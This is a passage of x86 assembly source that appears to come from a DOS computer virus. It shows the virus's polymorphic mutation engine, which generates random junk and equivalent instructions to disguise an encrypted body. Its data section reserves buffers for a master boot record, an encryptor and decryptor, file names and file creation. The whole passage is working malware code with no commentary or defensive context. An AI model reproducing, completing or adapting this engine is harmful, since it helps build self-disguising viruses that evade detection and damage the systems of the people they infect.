       cmp al,0E0h         ;LOOPxx
       jb  ItsMOV
       cmp al,0E2h
       ja  RandInt
       mov ah,0FDh
       push    ax
       lea bx,LoopTable
       mov al,Len4Loop
       call    RandLat
       call    ItsSTD
       pop ax
       stosw
       retn
   RandInt:
       cmp al,-1
       jne ItsMOV
       lea bx,IntTable2
       mov al,Len_Int2
       call    Rand
       push    ax
       xlat
       mov ch,al
       mov cl,0CDh         ;INT ??
       pop bx
       shl bx,1
       add bx,offset FunOffst
       mov bx,[bx]
       mov al,[bx]
       cmp al,-1
       je  NoFunction
       inc bx
       call    Rand
       xlat
       mov ah,al
       mov al,0B4h         ;MOV AH,??
       stosw
   NoFunction:
       xchg    cx,ax
       stosw
       retn
   ItsMOV:
       cmp al,0B0h
       jb  ItsAXop
       cmp al,0BFh
       ja  ItsCMP
       test    al,8
   CMPbyteShort:
       jz  CMPbyte
       stosb
   CMPword:
       call    BigRand
       stosw
       retn
   ItsAXop:
       test    al,4
       jz  ItsCMP
       test    al,0C2h
       jnz ItsCMP
       test    al,1
       jmp CMPbyteShort
   ItsCMP:
       stosb
       cmp al,0A9h         ;TEST AX,????
       je  CMPword
       cmp al,50h          ;PUSH WordRegister
       jb  ItsPUSHsh
       cmp al,57h
       jbe EmptyPop
       cmp al,70h          ;Jxx (jumps conditions)
       jb  ItsPUSHsh
       cmp al,7Fh
       ja  ItsREP
   ZeroStore:
       mov al,0
       mov Condition,al
       mov StoreCond,di
   NextStore:
       stosb
       retn
   ItsREP:
       cmp al,0F2h         ;REPNE
       je  ReallyREP
       cmp al,0F3h         ;REP
       jne ItsJCXZ
   ReallyREP:
       lea bx,CmpTable
       mov al,LenCmp
       jmp TakeIntNumber
   ItsJCXZ:
       cmp al,0E3h         ;JCXZ
       je  ZeroStore
       cmp al,91h          ;XCHG WordRegister,AX
   ItsPUSHsh:
       jb  ItsPUSH
       cmp al,97h
       ja  ItsShort
       cmp ah,WorkReg
       jne NextStore
       retn
   ItsShort:
       cmp al,0EBh         ;JMP SHORT
       jne ItsJMP
       call    RandEight
       stosb
   RetJMP:
       add di,ax
       retn
   ItsJMP:
       cmp al,0E9h         ;JMP NEAR
       jne ItsCALL
       call    RandEight
       stosw
       jmp RetJMP
   UsePop:
       call    GetEmptyReg
       or  al,0
       org $-1
       pop ax
       stosb
       retn
   ItsCALL:
       cmp al,0E8h         ;CALL NEAR
       jne ItsINT
       call    RandEight
       stosw
       add di,ax
   EmptyPop:
       call    AltNOP
   PopEmpty:
       call    RandFour
       jz  UsePop
       dec ax
       dec ax
       mov ax,0
       org $-2
       inc sp
       inc sp
       js  StoreWord
       mov al,83h          ;ADD SP,2
       stosb
       mov ax,2C4h
       jz  StoreWord
       mov ax,0FEECh       ;SUB SP,-2
   StoreWord:
       stosw
       retn
   ItsINT:
       cmp al,0CDh         ;INT xx
       jne ItsPUSHF
       lea bx,IntTable
       mov al,Len_Int
   TakeIntNumber:
       jmp RandLatShort
   ItsPUSHF:
       cmp al,0
       org $-1
       pushf
       jne NoPUSHF
       inc ax
       call    AltNOP
       call    RandZF
       jz  PopEmpty
       stosb
       retn
   NoPUSHF:
       cmp al,0D4h         ;AAM
       je  NonZeroGarbage
       cmp al,0D5h         ;AAD
       jne ItsPUSH
   NonZeroGarbage:
       call    RandByte
       inc ax
       stosb
       retn
   ItsPUSH:
       cmp ah,JumpSYS
       lahf
       cmp al,0
       org $-1
       push    es
       je  StorePOP
       cmp al,0
       org $-1
       push    cs
       je  StorePOP
       cmp al,0
       org $-1
       push    ds
       je  StorePOP
       cmp al,0
       org $-1
       push    ss
       jne ItsSS
       sahf
       je  StorePop
       inc ax
       jmp StoreAlt
   ItsSS:
       cmp al,36h          ;SS prefix
       jne ItsSTD
       sahf
       jne StoreBreak
   ItsSTD:
       cmp al,0
       org $-1
       std
       jne ItsOther
   StoreBreak:
       mov byte ptr [di-1],0
       org $-1
       int 3
   ItsOther:
       retn
   StorePOP:
       mov al,Len_Pop
       sahf
       je  ThreePop
       dec ax
   ThreePop:
       call    RandZF
       jnz EmptyPop
       call    AltNOP
       lea bx,PopTable
   RandLatShort:
       jmp RandLat

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   SeTrickFn:
       mov al,0B4h         ;MOV AH,??
       stosb
       lea bx,TrickFn2
       mov al,LenTrickFn2
       call    RandLat
       jmp StorePrefix

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   SetDrv:
       call    RandHalf
       jnz ZeroDrv
       call    BigRand
       mov al,0B2h         ;MOV DL,??
       and ah,7Fh
       stosw
       jmp NoZeroDrv
   ZeroDrv:
       inc ax
       call    ZeroReg
       test    ah,ah
       jnz StorePrefix
   NoZeroDrv:
       call    StorePrefix
       mov al,0
       org $-1
       clc
       stosb

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   StorePrefix:
       lea bx,PrefixGarbage
       mov al,LenPrefixGarbage
       jmp GetOrNo

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   OneGen:
       lea bx,BooTable
       mov al,LenLoader
   GetOrNo:
       call    RandZF
       jz  NoInclude
   RandLat:
       call    Rand
       xlat
       stosb
   NoInclude:
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   DecrementCX:
       push    ax bx
       mov al,1            ;CX
       call    IncOrDecReg
       dec ax
       pushf
       call    StorePrefix
       popf
       pop ax bx
       jz  RandLat
       dec ax
       jmp RandLat
   IncrementReg:
       mov bh,1000000B     ;INC WordRegister
   IncOrDecReg:
       push    ax
       test    bh,bh
       jpe NoIncReg
       mov bl,0A6h         ;CMPSB
       cmp al,110B         ;SI?
       je  ItsRegSI
       cmp al,111B         ;DI?
       jne NoIncReg
       call    RandHalf
       jz  ItsRegSI
       mov bl,0AEh         ;SCASB
   ItsRegSI:
       call    RandHalf
       jnz NoIncReg
       pop ax
       xchg    bx,ax
       stosb
       retn
   NoIncReg:
       call    RandHalf
       jnz NoCrement
       pop ax
       or  al,bh
   OneStore:
       stosb
       retn
   NoCrement:
       call    RandHalf
       mov bl,11000000B        ;ADD
       jz  LetADD
       mov bl,11101000B        ;SUB
   LetADD:
       pop ax
       or  bl,al
       call    RandShift
       pushf
       or  al,10000001B
       mov ah,bl
       stosw
       mov ax,1
       test    bl,101000B      ;SUB?
       jnz WasSUB
       xor bh,1000B
   WasSUB:
       test    bh,bh
       jpe PlusOne
       neg ax
   PlusOne:
       popf
       jnz OneStore
       stosw
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   AltNOP:
       push    ax
       call    RandHalf
       jz  NoAlt
       mov al,2
       call    GetNOP
       call    ax
   NoAlt:
       pop ax
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   SimpleNOP2:
       lea bx,SpecTable1
       mov al,Len_Spec1
       call    Rand
       xlat
       mov dx,ax           ;command bits
       xchg    bx,ax
       call    RandFour
       mov dh,0C0h
       mov ch,3
       cmp bl,86h          ;XCHG ?
       jne NoXchgChoice
       call    RandHalf
       or  dl,al
       cmp ah,WorkReg
       jne NoWorkEmpty
       call    GetXCHG
       or  dh,al
       lea ax,ComReg
       push    ax
   GetXCHG:
       call    RandEight
       cmp al,4
       jne NotBeAH
       test    dl,dl
       jpo NotBeAH
   NoMayAllReg:
       dec ax
   NotBeAH:
       retn
   NoWorkEmpty:
       test    dl,dl
       jpo ModeByte
       call    GetEmptyReg
       or  dh,al
       lea ax,ComReg
       push    ax
   GetEmptyReg:
       call    GetReg
       call    CheckWorkReg
       jnz MayAllReg
       cmp al,1
       ja  CheckBase
       push    bx
       lea bx,RegTable1
       mov al,LenReg1
       call    Rand
       xlat
       pop bx
   CheckBase:
       cmp al,WorkReg
       je  NoMayAllReg
   MayAllReg:
       retn
   ModeByte:
       call    RandEight
       or  dh,al
       jmp ComReg
   NoXchgChoice:
       cmp bl,8Ch          ;MOV WordRegister,SegmRegister ?
       jne NoSegMove
       push    ax
       call    GetEmptyReg
       or  dh,al
       pop ax
       jmp ComReg
   NoSegMove:
       cmp bl,8Dh          ;LEA  ?
       pushf
       jne NoLEA
       call    RandThree
   NoLEA:
       mov ch,al
       mov cl,6
       shl al,cl           ;mode bits
       mov dh,al
       call    RandEight
       or  dh,al           ;reg(r/m)
       call    GetEmptyReg
       popf
       je  ComReg
       cmp bl,84h          ;TEST ?
       je  Compare
       cmp bl,38h          ;CMP  ?
       jne NoComp
       call    RandShift
       or  dl,al
   Compare:
       cmp ch,3
       jne NoAllReg
       call    RandHalf
       or  dl,al
   NoAllReg:
       call    RandEight
       jmp ComReg
   NoComp:
       or  dl,2
       call    GetSpecReg
   ComReg:
       mov cl,3
       shl al,cl
       or  dh,al
       xchg    dx,ax
       stosw
       jmp CommonNOP

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   SimpleNOP3:
       lea bx,SpecTable2
       mov al,Len_Spec2/2
       cmp WorkReg,0
       jne NoEmptyWork
       mov al,Len_Spec2All/2
   NoEmptyWork:
       call    CommonGet
       xchg    dx,ax
       mov bx,dx
       call    RandFour
       mov ch,al
       mov cl,6
       shl al,cl
       or  dh,al
       cmp bx,0F6h         ;TEST ?
       je  BigComp
       cmp bx,20F6h        ;MUL  ?
       je  BigComp
       cmp bx,28F6h        ;IMUL ?
       je  BigComp
       cmp bx,3880h        ;CMP  ?
       jne NoBigComp
   BigComp:
       cmp al,0C0h
       jne NoAllRegAgain
       call    RandHalf
       or  dl,al
   NoAllRegAgain:
       call    RandEight
       jmp BigComReg
   NoBigComp:
       or  dh,0C0h
       mov ch,3
       call    GetSpecReg
   BigComReg:
       or  dh,al
       xchg    dx,ax
       stosw
       call    CheckSpec
       je  CommonNOP
       call    ByteGarbage
       test    al,1
       jz  CommonNOP
       call    ByteGarbage

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   CommonNOP:
       dec ch
       jns NoZeroMode
       and ah,111B
       cmp ah,110B
       jne NoDirect
   DoubleGarbage:
       call    ByteGarbage
   ByteGarbage:
       push    ax
       call    BigRand
       stosb
       pop ax
       retn
   NoZeroMode:
       jz  ByteGarbage
       dec ch
       jz  DoubleGarbage
   NoDirect:
       retn

   ;++ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ++;
   Len_Const   equ $-Start
   MBRBuffer   db  LenMBR dup (?)
   Encryptor:
   ;CntCom*(STC[CLC]+CMC+ADD [BaseRegister],AL+Change AL)+INC BaseRegister+LOOP+RETN
   Encrypt     db  CntCom*(1+1+2+2)+1+2+1 dup (?)
   Header      db  1Ah-0Bh dup (?)
   BaseTable   db  0Bh dup (?)
   Count       db  ?
   MainBuffer  db  Len_Const dup (?)
           db  0FEh-4 dup (?)
   Temp        dw  ?
   SegEPB      dw  ?
   Decrypt     db  900-80h-12 dup (?)
   NameBuffer  db  80h-12 dup (?)
   CreateBuffer    db  80h dup (?)
   Common_Len  equ $-Start
           org DskBuffer
   save_XMS_entry  dd  ?

       end Start
